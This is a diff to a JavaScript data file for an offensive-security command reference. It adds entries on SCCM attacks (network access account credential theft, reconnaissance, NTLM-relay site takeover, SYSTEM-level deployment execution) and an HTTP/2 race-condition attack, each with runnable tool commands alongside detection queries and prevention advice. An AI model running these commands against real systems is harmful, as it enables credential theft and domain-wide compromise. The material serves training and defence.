+            "logic": "index=web uri_path=\"/saml/acs\"\n| rex field=form_data \"SAMLResponse=(?<saml>[^&]+)\"\n| eval decoded=urldecode(saml)\n| eval assertion_count=mvcount(split(decoded,\"<saml:Assertion\"))\n| where assertion_count>2 OR like(decoded,\"%NameID%<!--%\")\n| table _time clientip assertion_count",
+            "data_source": "iis",
+            "attack": [
+              "T1606.002",
+              "T1550"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Legitimate multi-assertion responses are rare but exist in some federations; validate against the IdP's normal response shape.",
+            "tuning": "Baseline the normal assertion count and NameID format per IdP; alert on structural deviations only."
+          }
+        ]
+      }
+    },
+    {
       "id": "ad-sapphire-ticket",
       "name": "Sapphire Ticket - Hybrid Diamond Ticket with S4U2Self",
       "command": "Rubeus.exe diamond /krbkey:<krbtgt_aes256> /tgtdeleg /enctype:aes /user:administrator /dc:<dc_ip> /ticketuserid:500 /groups:512",
@@ -141623,6 +146305,215 @@ const COMMAND_DATA = {
             "confidence": "medium",
             "false_positives": "Legitimate Kerberos renewals and delegation",
             "tuning": "Correlate with DCSync detection (Event 4662 with replication rights)"
+          }
+        ]
+      }
+    },
+    {
+      "id": "sccm-naa-credential-extract",
+      "name": "SCCM Network Access Account (NAA) Credential Extraction",
+      "command": "sccmhunter.py get naa -u <user> -p <password> -ip <ip>",
+      "description": "The SCCM Network Access Account (NAA) is a domain account clients use to reach content when not domain-authenticated. Clients download it inside machine policy from the Management Point and store it DPAPI-encrypted in WMI/CIM (root\\ccm\\policy\\machine or the CIM repository). A low-privilege attacker can request the policy from the MP and decrypt the NAA (sccmhunter get naa / SharpSCCM get naa), or read the legacy plaintext NAA from a client's WMI - yielding usable domain credentials.",
+      "platform": "windows",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Active Directory",
+      "subcategory": "SCCM Attacks",
+      "certifications": [
+        "CRTP"
+      ],
+      "primary_cert": "CRTP",
+      "source": "Misconfiguration Manager (CRED-1/CRED-2); SharpSCCM",
+      "tags": [
+        "sccm",
+        "mecm",
+        "naa",
+        "network-access-account",
+        "dpapi",
+        "credential-access",
+        "wmi"
+      ],
+      "mitre": [
+        "T1555",
+        "T1078.002"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== VIA POLICY REQUEST (no admin on a client needed - CRED-1) ===\n  # sccmhunter asks the MP for machine policy, pulls and decrypts the NAA blob:\n  sccmhunter.py get naa -u <user> -p <password> -ip <ip>\n  # SharpSCCM equivalent (registers a rogue device or uses current context):\n  SharpSCCM.exe get naa\n  SharpSCCM.exe get secrets -mp <mp_host> -sc <sitecode>\n\n=== FROM A CLIENT (local admin / SYSTEM - CRED-2) ===\n  # DPAPI-encrypted policy secrets live in WMI:\n  SharpSCCM.exe local secrets                 # decrypts NAA, task-sequence, collection vars\n  # Manual WMI read of the encrypted blobs:\n  Get-WmiObject -Namespace root\\ccm\\policy\\Machine\\ActualConfig -Class CCM_NetworkAccessAccount\n  # Legacy plaintext NAA sometimes present in:\n  #   root\\ccm\\policy\\machine  or the OBJECT_LOCKS / CIM repository\n\n=== USE THE CREDENTIALS ===\n  # NAA is a domain account - spray / authenticate it:\n  netexec smb <dc_ip> -u <naa_user> -p <naa_pass>\n  # Often over-privileged (reused admin), enabling immediate lateral movement.\n\n=== ALTERNATIVES ===\n  mimikatz 'dpapi::...'          # manual DPAPI if you have the masterkey\n  PXE media task-sequence vars   # another source of domain-join creds",
+      "examples": [
+        {
+          "label": "Request + decrypt NAA from the MP",
+          "command": "sccmhunter.py get naa -u <user> -p <password> -ip <ip>"
+        },
+        {
+          "label": "Dump local policy secrets as SYSTEM",
+          "command": "SharpSCCM.exe local secrets"
+        },
+        {
+          "label": "Spray the recovered NAA",
+          "command": "netexec smb <dc_ip> -u <naa_user> -p <naa_pass>"
+        }
+      ],
+      "references": [
+        {
+          "title": "Misconfiguration Manager - CRED-1 (NAA)",
+          "url": "https://github.com/subat0mik/Misconfiguration-Manager"
+        },
+        {
+          "title": "SharpSCCM",
+          "url": "https://github.com/Mayyhem/SharpSCCM"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "sccm-sccmhunter-recon",
+          "note": "Locate the MP before requesting policy from it.",
+          "rel": "prereq"
+        },
+        {
+          "id": "sccm-cmloot-dp-looting",
+          "note": "Distribution Points are another credential source.",
+          "rel": "next"
+        },
+        {
+          "id": "ad-gpp-decrypt",
+          "note": "GPP cPassword is a parallel source of stored domain creds.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Clients must be able to obtain the NAA to fetch content, so the MP serves it inside machine policy, DPAPI-protected with a key the client (and therefore local SYSTEM) can derive. A rogue or registered device can request the same policy, and legacy sites stored the NAA in plaintext in WMI. The NAA is frequently a reused or over-privileged domain account.",
+        "prerequisites": "CRED-1: network access to the MP and the ability to request machine policy (a domain account, or an attacker-registered device). CRED-2: local admin/SYSTEM on an SCCM client.",
+        "impact": "Recovery of valid domain credentials (often over-privileged), enabling authentication, spraying, and lateral movement across the estate.",
+        "detection": "[MITRE T1555] New/unknown device records requesting machine policy from the MP; SharpSCCM default device names; WMI reads of CCM_NetworkAccessAccount; policy requests from hosts that are not managed clients.",
+        "artifacts": "MP IIS logs for policy requests (/ccm_system_windowsauth, CCM_POST); SMS_MP / MP_GetPolicy entries; Sysmon WMI (EventID 19-21) on CCM_Policy namespaces; new device registration in the SCCM console.",
+        "splunk_spl": "index=windows (source=\"*W3SVC*\" OR sourcetype=iis) cs_uri_stem=\"*ccm_system*\" OR cs_uri_stem=\"*GetPolicy*\"\n| stats count by c_ip, cs_username, cs_uri_stem\n| where count > 5",
+        "elastic_kql": "url.path:(*ccm_system* or *GetPolicy*) and source.ip:*",
+        "sentinel_kql": "W3CIISLog\n| where csUriStem has_any (\"ccm_system\", \"GetPolicy\", \"SMS_MP\")\n| summarize Count=count() by cIP, csUserName, csUriStem, bin(TimeGenerated, 1h)\n| where Count > 5",
+        "sigma_rules": "win_sccm_naa_policy_request_anomaly",
+        "prevention": "Stop using an NAA where possible (use Enhanced HTTP + PKI so clients authenticate as themselves); if required, make the NAA a low-privilege account with no interactive logon and no admin rights; enable Enhanced HTTP and require PKI on MPs; monitor and approve device registrations; rotate the NAA and remove any legacy plaintext copies.",
+        "sources": [
+          "https://github.com/subat0mik/Misconfiguration-Manager",
+          "https://github.com/Mayyhem/SharpSCCM"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "SCCM machine-policy request from non-managed host (NAA theft)",
+            "logic": "W3CIISLog\n| where csUriStem has_any (\"ccm_system\", \"GetPolicy\")\n| summarize Count=count() by cIP, csUserName, bin(TimeGenerated, 1h)\n| where Count > 5",
+            "data_source": "iis",
+            "attack": [
+              "T1555"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "Newly imaged clients and re-registering devices request policy normally.",
+            "tuning": "Correlate requesting IP against the managed-client inventory; alert on source IPs that are not SCCM clients."
+          }
+        ]
+      }
+    },
+    {
+      "id": "sccm-sccmhunter-recon",
+      "name": "sccmhunter - SCCM/MECM Site Reconnaissance",
+      "command": "sccmhunter.py find -u <user> -p <password> -d <domain> -dc-ip <dc_ip>",
+      "description": "sccmhunter locates Microsoft Configuration Manager (SCCM/MECM) infrastructure - Management Points (MP), site servers, SMS Providers, and Distribution Points - by querying LDAP for the System Management container and SCCM service-connection-point objects, then probing HTTP(S) MP endpoints. The 'find' module enumerates servers and the 'smsprovider' / 'mp' modules profile roles, which seeds every downstream SCCM attack (NAA extraction, DP looting, site takeover).",
+      "platform": "multi",
+      "type": "command",
+      "opsec": "quiet",
+      "category": "Active Directory",
+      "subcategory": "SCCM Attacks",
+      "certifications": [
+        "CRTP"
+      ],
+      "primary_cert": "CRTP",
+      "source": "garrettfoster13/sccmhunter",
+      "tags": [
+        "sccm",
+        "mecm",
+        "sccmhunter",
+        "recon",
+        "management-point",
+        "distribution-point",
+        "sms-provider"
+      ],
+      "mitre": [
+        "T1046",
+        "T1087.002"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== INSTALL ===\n  git clone https://github.com/garrettfoster13/sccmhunter\n  cd sccmhunter; pip3 install -r requirements.txt\n\n=== FIND SCCM INFRASTRUCTURE (LDAP) ===\n  # Any authenticated domain user can read the System Management container:\n  sccmhunter.py find -u <user> -p <password> -d <domain> -dc-ip <dc_ip>\n  # Results land in a local sqlite db (~/.sccmhunter.db) and are shown on screen:\n  #   - Management Points (MP), SMS Providers, site servers, site code\n\n=== PROFILE / ENUMERATE ROLES (HTTP) ===\n  sccmhunter.py smsprovider -u <user> -p <password> -d <domain> -dc-ip <dc_ip>\n  sccmhunter.py mp -u <user> -p <password> -d <domain> -dc-ip <dc_ip>\n  # 'show' prints what has been collected:\n  sccmhunter.py show -all\n\n=== WHY IT MATTERS ===\n  - The site code + MP + SMS Provider are prerequisites for NAA policy requests,\n    DP looting, PXE abuse, and NTLM-relay site takeover.\n  - SCCM objects (mSSMSManagementPoint, mSSMSSite) are world-readable in LDAP.\n\n=== ALTERNATIVES ===\n  SharpSCCM.exe local site-info     # local host perspective\n  PowerSCCM / sccmwtf              # older tooling\n  ldapsearch -b \"CN=System Management,CN=System,<base_dn>\"   # manual",
+      "examples": [
+        {
+          "label": "Find all SCCM servers via LDAP",
+          "command": "sccmhunter.py find -u <user> -p <password> -d <domain> -dc-ip <dc_ip>"
+        },
+        {
+          "label": "Profile the SMS Provider",
+          "command": "sccmhunter.py smsprovider -u <user> -p <password> -d <domain> -dc-ip <dc_ip>"
+        },
+        {
+          "label": "Dump everything collected",
+          "command": "sccmhunter.py show -all"
+        }
+      ],
+      "references": [
+        {
+          "title": "sccmhunter",
+          "url": "https://github.com/garrettfoster13/sccmhunter"
+        },
+        {
+          "title": "Misconfiguration Manager - RECON",
+          "url": "https://github.com/subat0mik/Misconfiguration-Manager"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "sccm-naa-credential-extract",
+          "note": "Request NAA creds from the MP found here.",
+          "rel": "next"
+        },
+        {
+          "id": "sccm-cmloot-dp-looting",
+          "note": "Loot the Distribution Points identified here.",
+          "rel": "next"
+        },
+        {
+          "id": "sccm-site-takeover-relay",
+          "note": "Relay to the SMS Provider / site server mapped here.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "SCCM publishes its roles (Management Point, SMS Provider, site servers) as objects in the LDAP System Management container and via the service connection point, all of which any authenticated domain user can read. MP HTTP endpoints also respond to unauthenticated or low-privilege probes, so discovery needs no special rights.",
+        "prerequisites": "A valid low-privilege domain account (for LDAP). Network reach to the DC and to the MP/SMS Provider HTTP(S) endpoints.",
+        "impact": "Full map of the SCCM hierarchy (site code, MPs, SMS Providers, DPs), which is the prerequisite for NAA credential theft, DP looting, PXE abuse, and site takeover.",
+        "detection": "[MITRE T1046] Bursts of LDAP queries from one account for mSSMSManagementPoint / mSSMSSite / sccm objects; unusual HTTP requests to MP CCM_POST / SMS_MP endpoints from non-client hosts.",
+        "artifacts": "Directory Service (4662) access to the System Management container; IIS logs on the MP showing /ccm_system / /SMS_MP requests from unexpected sources; sccmhunter sqlite db on the attacker host.",
+        "splunk_spl": "index=windows sourcetype=\"WinEventLog:Security\" EventCode=4662 Object_Name=\"*System Management*\"\n| stats count dc(Object_Name) by Account_Name, src_ip\n| where count > 20",
+        "elastic_kql": "event.code:\"4662\" and winlog.event_data.ObjectName:*System*Management*",
+        "sentinel_kql": "SecurityEvent\n| where EventID == 4662\n| where ObjectName has \"System Management\"\n| summarize Count=count() by SubjectUserName, Computer, bin(TimeGenerated, 1h)\n| where Count > 20",
+        "sigma_rules": "win_sccm_system_management_ldap_recon",
+        "prevention": "Treat the SCCM site code and server inventory as sensitive; segment MP/SMS Provider networks; monitor directory reads of the System Management container; apply least privilege and require HTTPS + Enhanced HTTP on MPs so anonymous probing is limited.",
+        "sources": [
+          "garrettfoster13/sccmhunter",
+          "https://github.com/subat0mik/Misconfiguration-Manager"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "LDAP reconnaissance of SCCM System Management container",
+            "logic": "SecurityEvent\n| where EventID == 4662\n| where ObjectName has \"System Management\"\n| summarize Count=count(), Objs=dcount(ObjectName) by SubjectUserName, Computer, bin(TimeGenerated, 1h)\n| where Count > 20",
+            "data_source": "windows-security",
+            "log_ids": [
+              "4662"
+            ],
+            "attack": [
+              "T1087.002"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "SCCM admin consoles and management tooling enumerate these objects legitimately.",
+            "tuning": "Allowlist SCCM server and admin-console hosts; alert on reads from ordinary workstation accounts."
           }
         ]
       }
@@ -146159,6 +151050,215 @@ const COMMAND_DATA = {
       "explain": "Collects BloodHound data natively on a Windows host:\n  .\\SharpHound.exe   the C# collector\n  -c All             run all collection methods (more accurate sessions/local-admin than the Python collector)\n  --zipfilename <name>   name the output ZIP\nProduces a ZIP of JSON to import into BloodHound; use -c DCOnly for a quieter LDAP-only collection with no host touching."
     },
     {
+      "id": "sccm-app-deployment-exec",
+      "name": "SharpSCCM - Application Deployment Execution (Post-Takeover)",
+      "command": "SharpSCCM.exe exec -d <target> -p \"<command>\"",
+      "description": "After gaining SCCM Full Administrator (site takeover) or sufficient console rights, SharpSCCM's exec / the admin service can deploy an application or run a program against a target device or collection. SCCM installs run in the SYSTEM context on the client, so pushing a command, script, or installer provides reliable SYSTEM-level code execution and lateral movement across every managed endpoint - the payoff of SCCM compromise.",
+      "platform": "windows",
+      "type": "command",
+      "opsec": "loud",
+      "category": "Active Directory",
+      "subcategory": "SCCM Attacks",
+      "certifications": [
+        "CRTP"
+      ],
+      "primary_cert": "CRTP",
+      "source": "Misconfiguration Manager (EXEC); SharpSCCM",
+      "tags": [
+        "sccm",
+        "mecm",
+        "sharpsccm",
+        "software-deployment",
+        "lateral-movement",
+        "system",
+        "admin-service"
+      ],
+      "mitre": [
+        "T1072",
+        "T1078.002"
+      ],
+      "exam": "restricted",
+      "notes": "=== EXECUTE ON A DEVICE (runs as SYSTEM) ===\n  # Deploy a one-liner / application to a specific device:\n  SharpSCCM.exe exec -d <target> -p \"<command>\"\n  # Target by resource id instead of name:\n  SharpSCCM.exe exec -rid <resourceid> -p \"powershell -enc <b64>\"\n\n=== COERCE A DEVICE TO AUTH (relay primitive) ===\n  # exec can also force the client to authenticate to you (NTLM capture/relay):\n  SharpSCCM.exe exec -d <target> -r <lhost>\n\n=== VIA THE ADMIN SERVICE (REST) ===\n  # With Full Admin, create an application + deployment to a collection:\n  #   POST https://<smsprovider>/AdminService/wmi/SMS_Application\n  #   then SMS_ApplicationDeployment to the target collection\n  # or use the console / PowerShell cmdlets (New-CMApplication, Invoke-CMScript)\n\n=== CLEANUP ===\n  # Remove the application/deployment and collection membership you created\n  SharpSCCM.exe exec --help   # review removal flags for the objects you added\n\n=== WHY IT WORKS ===\n  - SCCM client agent executes deployments as NT AUTHORITY\\SYSTEM.\n  - A Full Administrator can target any device or collection in the hierarchy.\n\n=== ALTERNATIVES ===\n  impacket psexec/wmiexec       # direct exec if you already hold creds\n  Invoke-CMScript (console)     # built-in script execution",
+      "examples": [
+        {
+          "label": "Run a command on a device as SYSTEM",
+          "command": "SharpSCCM.exe exec -d <target> -p \"<command>\""
+        },
+        {
+          "label": "Target by resource id with encoded PS",
+          "command": "SharpSCCM.exe exec -rid <resourceid> -p \"powershell -enc <b64>\""
+        },
+        {
+          "label": "Coerce a client to authenticate to you",
+          "command": "SharpSCCM.exe exec -d <target> -r <lhost>"
+        }
+      ],
+      "references": [
+        {
+          "title": "Misconfiguration Manager - EXEC",
+          "url": "https://github.com/subat0mik/Misconfiguration-Manager"
+        },
+        {
+          "title": "SharpSCCM",
+          "url": "https://github.com/Mayyhem/SharpSCCM"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "sccm-site-takeover-relay",
+          "note": "Gain Full Administrator before deploying payloads.",
+          "rel": "prereq"
+        },
+        {
+          "id": "impacket-exec",
+          "note": "Direct remote exec alternative once you hold creds.",
+          "rel": "alternative"
+        },
+        {
+          "id": "secretsdump-ntds",
+          "note": "Dump domain secrets after SYSTEM on key hosts.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "SCCM is designed to run deployed applications and scripts in the SYSTEM context on managed clients, and a Full Administrator can target any device or collection. An attacker who has taken over the site therefore has a sanctioned, built-in mechanism for SYSTEM-level execution estate-wide.",
+        "prerequisites": "SCCM Full Administrator (or Application Author/Deployment rights) and a reachable Management Point/admin service; the target devices must have the SCCM client installed and checking in.",
+        "impact": "SYSTEM-level code execution on any managed endpoint, enabling mass lateral movement, credential theft, and domain compromise.",
+        "detection": "[MITRE T1072] New application/package + deployment created and immediately targeted at a device or ad-hoc collection; CcmExec spawning cmd/powershell with suspicious arguments on clients; off-hours deployments from an unusual admin.",
+        "artifacts": "SCCM console audit (SMS_Application, SMS_Deployment creation); client AppEnforce.log / execmgr.log; Sysmon process creation where parent is CcmExec.exe spawning cmd.exe/powershell.exe; 4688 process-creation events under SYSTEM.",
+        "splunk_spl": "index=windows EventCode=1 ParentImage=\"*CcmExec.exe\" (Image=\"*cmd.exe\" OR Image=\"*powershell.exe\" OR Image=\"*rundll32.exe\")\n| stats count by Computer, Image, CommandLine\n| where count > 0",
+        "elastic_kql": "process.parent.name:\"CcmExec.exe\" and process.name:(\"powershell.exe\" or \"cmd.exe\" or \"rundll32.exe\")",
+        "sentinel_kql": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"CcmExec.exe\"\n| where FileName in~ (\"powershell.exe\", \"cmd.exe\", \"rundll32.exe\", \"mshta.exe\")\n| project TimeGenerated, DeviceName, FileName, ProcessCommandLine",
+        "sigma_rules": "win_sccm_ccmexec_spawns_shell",
+        "prevention": "Limit SCCM Full Administrator and application-authoring roles (RBAC, least privilege, Tier 0); require approval workflows for new applications/deployments; alert on new app+deployment creation and on CcmExec spawning shells; enable Enhanced HTTP/PKI and monitor the admin service; review collection membership changes.",
+        "sources": [
+          "https://github.com/subat0mik/Misconfiguration-Manager",
+          "https://github.com/Mayyhem/SharpSCCM"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "SCCM client agent (CcmExec) spawns a command interpreter",
+            "logic": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"CcmExec.exe\"\n| where FileName in~ (\"powershell.exe\", \"cmd.exe\", \"rundll32.exe\", \"mshta.exe\")\n| project TimeGenerated, DeviceName, FileName, ProcessCommandLine, AccountName",
+            "data_source": "defender-endpoint",
+            "attack": [
+              "T1072"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "Legitimate SCCM application/script deployments also spawn interpreters.",
+            "tuning": "Baseline approved deployments and packages; alert on interpreters with encoded/obfuscated command lines or outbound network activity."
+          }
+        ]
+      }
+    },
+    {
+      "id": "sccm-site-takeover-relay",
+      "name": "SharpSCCM - SCCM Site Takeover via NTLM Relay",
+      "command": "SharpSCCM.exe invoke client-push -t <lhost>",
+      "description": "SCCM site takeover (Misconfiguration Manager TAKEOVER) coerces NTLM authentication from a site server or a privileged machine account - via automatic client push installation or a coercion primitive - and relays it to the SMS Provider (admin service / SMS_Admin) or to the site database (MSSQL). Relaying machine-account auth to the site DB or SMS Provider grants Full Administrator over the SCCM hierarchy, from which applications and scripts can be deployed as SYSTEM to any managed device.",
+      "platform": "multi",
+      "type": "command",
+      "opsec": "loud",
+      "category": "Active Directory",
+      "subcategory": "SCCM Attacks",
+      "certifications": [
+        "CRTP"
+      ],
+      "primary_cert": "CRTP",
+      "source": "Misconfiguration Manager (TAKEOVER-1/2); SharpSCCM; ntlmrelayx",
+      "tags": [
+        "sccm",
+        "mecm",
+        "sharpsccm",
+        "ntlm-relay",
+        "site-takeover",
+        "client-push",
+        "mssql"
+      ],
+      "mitre": [
+        "T1557.001",
+        "T1078.002"
+      ],
+      "exam": "restricted",
+      "notes": "=== TRIGGER COERCION (automatic client push - TAKEOVER-1) ===\n  # Abuse automatic client push to make the site/primary server authenticate to you:\n  SharpSCCM.exe invoke client-push -t <lhost>\n  # SharpSCCM can also enumerate push settings first:\n  SharpSCCM.exe get client-push-settings\n\n=== RELAY TO THE SMS PROVIDER (admin service) ===\n  # Relay the coerced machine auth to the SMS Provider HTTP admin service:\n  ntlmrelayx.py -t https://<smsprovider>/AdminService/wmi/SMS_... -smb2support\n  # Or relay to MSSQL site DB (TAKEOVER-2):\n  ntlmrelayx.py -t mssql://<sitedb_host> -smb2support -q \"...\"\n\n=== ALTERNATIVE COERCION PRIMITIVES ===\n  # Any coercion to the site server works (PetitPotam / Coercer):\n  Coercer coerce -u <user> -p <password> -t <site_server> -l <lhost>\n  PetitPotam.py <lhost> <site_server>\n\n=== RESULT ===\n  # Add your principal as a Full Administrator in SCCM, then deploy payloads:\n  #   -> see sccm-app-deployment-exec for execution as SYSTEM\n\n=== ALTERNATIVES ===\n  ad-krbrelayup / krbrelayx    # Kerberos relay variants\n  Relay to ADCS (ESC8)         # different relay target",
+      "examples": [
+        {
+          "label": "Coerce site server via client push",
+          "command": "SharpSCCM.exe invoke client-push -t <lhost>"
+        },
+        {
+          "label": "Relay to MSSQL site database",
+          "command": "ntlmrelayx.py -t mssql://<sitedb_host> -smb2support"
+        },
+        {
+          "label": "Coerce with Coercer instead",
+          "command": "Coercer coerce -u <user> -p <password> -t <target> -l <lhost>"
+        }
+      ],
+      "references": [
+        {
+          "title": "Misconfiguration Manager - TAKEOVER",
+          "url": "https://github.com/subat0mik/Misconfiguration-Manager"
+        },
+        {
+          "title": "SharpSCCM",
+          "url": "https://github.com/Mayyhem/SharpSCCM"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ad-coercer-multi",
+          "note": "Coercion primitive to force the site-server authentication.",
+          "rel": "prereq"
+        },
+        {
+          "id": "ad-krbrelayx",
+          "note": "Alternative relay toolkit for the coerced auth.",
+          "rel": "alternative"
+        },
+        {
+          "id": "sccm-app-deployment-exec",
+          "note": "Deploy payloads as SYSTEM after takeover.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "SCCM automatic client push and the SMS Provider/site DB often lack SMB signing and channel binding / Extended Protection, so a coerced machine-account NTLM authentication can be relayed to the admin service (HTTP) or MSSQL. The site server's machine account is highly privileged in SCCM, so relaying it yields Full Administrator over the hierarchy.",
+        "prerequisites": "A coercion primitive or enabled automatic client push, a relay target (SMS Provider admin service or site DB) without EPA/signing, and network position to receive and relay the authentication.",
+        "impact": "Full Administrator over the SCCM hierarchy, enabling SYSTEM-level code execution on every managed device (effective domain-wide compromise).",
+        "detection": "[MITRE T1557.001] Machine-account logons to the SMS Provider/site DB from an unexpected host; client-push authentication to a non-SCCM IP; NTLM relay patterns (same account authenticating from attacker host); new SCCM Full Administrator added.",
+        "artifacts": "4624/4648 logons for the site-server machine account from an unusual source; MSSQL logins on the site DB from a non-SCCM host; SMS admin-service (IIS) requests; SCCM audit (SMS_Admin) showing a new Full Administrator.",
+        "splunk_spl": "index=windows EventCode=4624 Logon_Type=3 Account_Name=\"*$\" (dest=\"*smsprovider*\" OR dest=\"*sitedb*\")\n| stats count by Account_Name, src_ip, dest\n| where src_ip!=\"<expected_siteserver_ip>\"",
+        "elastic_kql": "event.code:\"4624\" and winlog.event_data.LogonType:\"3\" and user.name:*$ and winlog.event_data.IpAddress:*",
+        "sentinel_kql": "SecurityEvent\n| where EventID == 4624 and LogonType == 3 and TargetUserName endswith \"$\"\n| where Computer has_any (\"smsprovider\", \"sitedb\")\n| summarize Count=count() by TargetUserName, IpAddress, Computer, bin(TimeGenerated, 30m)",
+        "sigma_rules": "win_sccm_machineaccount_relay_to_provider",
+        "prevention": "Disable automatic client push installation (or require Kerberos-only and a strong push account with no admin); enforce SMB signing and Extended Protection for Authentication on the SMS Provider and site DB; require HTTPS/PKI (Enhanced HTTP); tier the site server as Tier 0; alert on new Full Administrators and on machine-account logons from unexpected hosts.",
+        "sources": [
+          "https://github.com/subat0mik/Misconfiguration-Manager",
+          "https://github.com/Mayyhem/SharpSCCM"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "Site-server machine-account relayed to SMS Provider / site DB",
+            "logic": "SecurityEvent\n| where EventID == 4624 and LogonType == 3 and TargetUserName endswith \"$\"\n| where Computer has_any (\"smsprovider\", \"sitedb\")\n| summarize Count=count(), Srcs=make_set(IpAddress) by TargetUserName, Computer, bin(TimeGenerated, 30m)",
+            "data_source": "windows-security",
+            "log_ids": [
+              "4624"
+            ],
+            "attack": [
+              "T1557.001"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "SCCM site components authenticate between roles legitimately.",
+            "tuning": "Allowlist the real site-server and SMS Provider source IPs; alert on the machine account authenticating from any other host."
+          }
+        ]
+      }
+    },
+    {
       "id": "ad-sharpview",
       "name": "SharpView - C# PowerView Equivalent",
       "command": ".\\SharpView.exe Get-DomainUser -Identity <user>",
@@ -147719,6 +152819,111 @@ const COMMAND_DATA = {
         }
       ],
       "explain": "Forges a Silver Ticket - a TGS for one service, signed with that service account's hash - bypassing the KDC entirely (quieter than golden):\n  silver                    forge a service ticket offline\n  /service:<spn>           the target SPN (e.g. cifs/<host> for file access)\n  /rc4:<nt_hash>           the service/machine account's NTLM hash\n  /sid:<domain_sid>        the domain SID\n  /user:Administrator      the user to impersonate to that service\n  /domain:<domain> /ptt    the domain, and inject the ticket\nNo AS/TGS request ever reaches a DC, so there is no 4768/4769 to correlate; access is limited to that one service."
+    },
+    {
+      "id": "web-race-single-packet",
+      "name": "Single-Packet Attack (HTTP/2 Race Conditions)",
+      "command": "# Turbo Intruder: engine=Engine.BURP2, requests sent with gate='race1'",
+      "description": "Exploits race conditions by eliminating network jitter so many requests reach the server within the same ~1ms window. Uses the HTTP/2 single-packet attack (up to ~20-30 requests in one TCP packet) or HTTP/1.1 last-byte synchronization to overrun limit/coupon/balance/one-time-use logic (limit-overrun and multi-endpoint race variants). Driven with Burp's Turbo Intruder and the Repeater 'send group in parallel' feature.",
+      "platform": "multi",
+      "type": "command",
+      "opsec": "loud",
+      "category": "Web",
+      "subcategory": "Business Logic",
+      "certifications": [
+        "CWES"
+      ],
+      "primary_cert": "CWES",
+      "source": "PortSwigger Web Security Academy - Race conditions",
+      "tags": [
+        "race-condition",
+        "single-packet",
+        "http2",
+        "turbo-intruder",
+        "business-logic",
+        "limit-overrun"
+      ],
+      "mitre": [
+        "T1190"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== WHY IT WORKS ===\n  Many checks (is this coupon used? is balance >= amount?) read state, then write it, without a lock. If N requests pass the read before any write lands (TOCTOU), all N succeed. The attack removes jitter so the requests hit the critical window simultaneously.\n\n=== SINGLE-PACKET ATTACK (HTTP/2) ===\n  - Send up to ~20-30 requests whose last frame is withheld, then release all final frames in ONE TCP packet. Server processes them with near-zero timing spread.\n  - Immune to network jitter (unlike the old 'last-byte sync' over many connections).\n\n=== LAST-BYTE SYNC (HTTP/1.1 fallback) ===\n  - Open N connections, send all but the final byte of each request, then send the last bytes together.\n\n=== BURP REPEATER (quick test) ===\n  - Add the request to a Repeater tab group.\n  - Group dropdown > 'Send group in parallel (single-packet attack)'.\n  - Good for 2-50 identical requests (coupon redeem, gift-card apply, vote).\n\n=== TURBO INTRUDER (programmatic) ===\n  def queueRequests(target, wordlists):\n      engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1, engine=Engine.BURP2)\n      for i in range(20):\n          engine.queue(target.req, gate='race1')\n      engine.openGate('race1')\n  def handleResponse(req, interesting):\n      table.add(req)\n\n=== TARGETS ===\n  - Redeem a single-use coupon/gift card many times.\n  - Withdraw/transfer more than the balance (limit overrun).\n  - Bypass rate limits / anti-brute-force counters.\n  - Multi-endpoint races (e.g. apply-then-confirm).",
+      "examples": [
+        {
+          "label": "Repeater: send a tab group in parallel",
+          "command": "Burp Repeater > group tab > 'Send group in parallel (single-packet attack)'"
+        },
+        {
+          "label": "Turbo Intruder single-packet template skeleton",
+          "command": "engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1, engine=Engine.BURP2)"
+        },
+        {
+          "label": "Open the gate to release all withheld final frames",
+          "command": "engine.openGate('race1')"
+        }
+      ],
+      "references": [
+        {
+          "title": "PortSwigger - Race conditions",
+          "url": "https://portswigger.net/web-security/race-conditions"
+        },
+        {
+          "title": "Smashing the state machine (James Kettle)",
+          "url": "https://portswigger.net/research/smashing-the-state-machine"
+        },
+        {
+          "title": "Turbo Intruder",
+          "url": "https://github.com/PortSwigger/turbo-intruder"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "burp-repeater",
+          "note": "Repeater's 'send group in parallel' is the quickest single-packet test.",
+          "rel": "prereq"
+        },
+        {
+          "id": "burp-intruder",
+          "note": "Intruder for the non-race brute-forcing this often accompanies.",
+          "rel": "alternative"
+        },
+        {
+          "id": "web-request-smuggling",
+          "note": "Another HTTP/2-level desync class driven from the same tooling.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "State-changing operations read a value (coupon unused, balance sufficient) and write the new value without holding a lock across the check. The single-packet attack collapses the timing spread so many requests pass the read phase before any write commits (a TOCTOU window).",
+        "prerequisites": "An endpoint whose outcome depends on shared mutable state with no atomic guard (uniqueness constraint, row lock, or idempotency key). HTTP/2 support helps but HTTP/1.1 last-byte sync also works.",
+        "impact": "Limit/coupon/gift-card/balance overrun, bypass of one-time-use and rate-limit controls, duplicate order or withdrawal, and other business-logic integrity loss.",
+        "detection": "[MITRE T1190] Bursts of near-identical requests to the same state-changing endpoint from one client within a few milliseconds, repeated 2xx on an action that should succeed at most once, and HTTP/2 flows releasing many stream END_STREAM frames together.",
